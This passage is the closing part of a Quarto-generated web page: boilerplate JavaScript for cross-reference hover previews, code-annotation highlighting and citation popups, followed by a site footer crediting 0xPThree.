      stripColumnClz(note)
      if (id === null || id.startsWith('sec-')) {
        // Special case sections, only their first couple elements
        const container = document.createElement("div");
        if (note.children && note.children.length > 2) {
          container.appendChild(note.children[0].cloneNode(true));
          for (let i = 1; i < note.children.length; i++) {
            const child = note.children[i];
            if (child.tagName === "P" && child.innerText === "") {
              continue;
            } else {
              container.appendChild(child.cloneNode(true));
              break;
            }
          }
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(container);
          }
          return container.innerHTML
        } else {
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(note);
          }
          return note.innerHTML;
        }
      } else {
        // Remove any anchor links if they are present
        const anchorLink = note.querySelector('a.anchorjs-link');
        if (anchorLink) {
          anchorLink.remove();
        }
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(note);
        }
        if (note.classList.contains("callout")) {
          return note.outerHTML;
        } else {
          return note.innerHTML;
        }
      }
    }
    for (var i=0; i<xrefs.length; i++) {
      const xref = xrefs[i];
      tippyHover(xref, undefined, function(instance) {
        instance.disable();
        let url = xref.getAttribute('href');
        let hash = undefined; 
        if (url.startsWith('#')) {
          hash = url;
        } else {
          try { hash = new URL(url).hash; } catch {}
        }
        if (hash) {
          const id = hash.replace(/^#\/?/, "");
          const note = window.document.getElementById(id);
          if (note !== null) {
            try {
              const html = processXRef(id, note.cloneNode(true));
              instance.setContent(html);
            } finally {
              instance.enable();
              instance.show();
            }
          } else {
            // See if we can fetch this
            fetch(url.split('#')[0])
            .then(res => res.text())
            .then(html => {
              const parser = new DOMParser();
              const htmlDoc = parser.parseFromString(html, "text/html");
              const note = htmlDoc.getElementById(id);
              if (note !== null) {
                const html = processXRef(id, note);
                instance.setContent(html);
              } 
            }).finally(() => {
              instance.enable();
              instance.show();
            });
          }
        } else {
          // See if we can fetch a full url (with no hash to target)
          // This is a special case and we should probably do some content thinning / targeting
          fetch(url)
          .then(res => res.text())
          .then(html => {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(html, "text/html");
            const note = htmlDoc.querySelector('main.content');
            if (note !== null) {
              // This should only happen for chapter cross references
              // (since there is no id in the URL)
              // remove the first header
              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
                note.children[0].remove();
              }
              const html = processXRef(null, note);
              instance.setContent(html);
            } 
          }).finally(() => {
            instance.enable();
            instance.show();
          });
        }
      }, function(instance) {
      });
    }
        let selectedAnnoteEl;
        const selectorForAnnotation = ( cell, annotation) => {
          let cellAttr = 'data-code-cell="' + cell + '"';
          let lineAttr = 'data-code-annotation="' +  annotation + '"';
          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
          return selector;
        }
        const selectCodeLines = (annoteEl) => {
          const doc = window.document;
          const targetCell = annoteEl.getAttribute("data-target-cell");
          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
          const lineIds = lines.map((line) => {
            return targetCell + "-" + line;
          })
          let top = null;
          let height = null;
          let parent = null;
          if (lineIds.length > 0) {
              //compute the position of the single el (top and bottom and make a div)
              const el = window.document.getElementById(lineIds[0]);
              top = el.offsetTop;
              height = el.offsetHeight;
              parent = el.parentElement.parentElement;
            if (lineIds.length > 1) {
              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
              height = bottom - top;
            }
            if (top !== null && height !== null && parent !== null) {
              // cook up a div (if necessary) and position it 
              let div = window.document.getElementById("code-annotation-line-highlight");
              if (div === null) {
                div = window.document.createElement("div");
                div.setAttribute("id", "code-annotation-line-highlight");
                div.style.position = 'absolute';
                parent.appendChild(div);
              }
              div.style.top = top - 2 + "px";
              div.style.height = height + 4 + "px";
              div.style.left = 0;
              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
              if (gutterDiv === null) {
                gutterDiv = window.document.createElement("div");
                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
                gutterDiv.style.position = 'absolute';
                const codeCell = window.document.getElementById(targetCell);
                const gutter = codeCell.querySelector('.code-annotation-gutter');
                gutter.appendChild(gutterDiv);
              }
              gutterDiv.style.top = top - 2 + "px";
              gutterDiv.style.height = height + 4 + "px";
            }
            selectedAnnoteEl = annoteEl;
          }
        };
        const unselectCodeLines = () => {
          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
          elementsIds.forEach((elId) => {
            const div = window.document.getElementById(elId);
            if (div) {
              div.remove();
            }
          });
          selectedAnnoteEl = undefined;
        };
          // Handle positioning of the toggle
      window.addEventListener(
        "resize",
        throttle(() => {
          elRect = undefined;
          if (selectedAnnoteEl) {
            selectCodeLines(selectedAnnoteEl);
          }
        }, 10)
      );
      function throttle(fn, ms) {
      let throttle = false;
      let timer;
        return (...args) => {
          if(!throttle) { // first call gets through
              fn.apply(this, args);
              throttle = true;
          } else { // all the others get throttled
              if(timer) clearTimeout(timer); // cancel #2
              timer = setTimeout(() => {
                fn.apply(this, args);
                timer = throttle = false;
              }, ms);
          }
        };
      }
        // Attach click handler to the DT
        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
        for (const annoteDlNode of annoteDls) {
          annoteDlNode.addEventListener('click', (event) => {
            const clickedEl = event.target;
            if (clickedEl !== selectedAnnoteEl) {
              unselectCodeLines();
              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
              if (activeEl) {
                activeEl.classList.remove('code-annotation-active');
              }
              selectCodeLines(clickedEl);
              clickedEl.classList.add('code-annotation-active');
            } else {
              // Unselect the line
              unselectCodeLines();
              clickedEl.classList.remove('code-annotation-active');
            }
          });
        }
    const findCites = (el) => {
      const parentEl = el.parentElement;
      if (parentEl) {
        const cites = parentEl.dataset.cites;
        if (cites) {
          return {
            el,
            cites: cites.split(' ')
          };
        } else {
          return findCites(el.parentElement)
        }
      } else {
        return undefined;
      }
    };
    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
    for (var i=0; i<bibliorefs.length; i++) {
      const ref = bibliorefs[i];
      const citeInfo = findCites(ref);
      if (citeInfo) {
        tippyHover(citeInfo.el, function() {
          var popup = window.document.createElement('div');
          citeInfo.cites.forEach(function(cite) {
            var citeDiv = window.document.createElement('div');
            citeDiv.classList.add('hanging-indent');
            citeDiv.classList.add('csl-entry');
            var biblioDiv = window.document.getElementById('ref-' + cite);
            if (biblioDiv) {
              citeDiv.innerHTML = biblioDiv.innerHTML;
            }
            popup.appendChild(citeDiv);
          });
          return popup.innerHTML;
        });
      }
    }
  });
  </script>
</div> <!-- /content -->
<footer class="footer">
  <div class="nav-footer">
    <div class="nav-footer-left">
      &nbsp;
    </div>   
    <div class="nav-footer-center">
      <ul class="footer-items list-unstyled">
    <li class="nav-item">
 © 2025 0xPThree - All Rights Reserved.
  </li>  
</ul>
    </div>
    <div class="nav-footer-right">
      <ul class="footer-items list-unstyled">
    <li class="nav-item compact">
    <a class="nav-link" href="https://signal.me/#eu/PjVScis0spvu9_S_xNysergThKuqsWQFOwQ7xisr7HJgaJT69xC0Ku2fo3Ng0B1">
      <i class="bi bi-signal" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="https://github.com/0xpthree">
      <i class="bi bi-github" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="../../index.xml">
      <i class="bi bi-rss" role="img">
</i> 
    </a>
  </li>  
</ul>
    </div>
  </div>
</footer>




</body></html>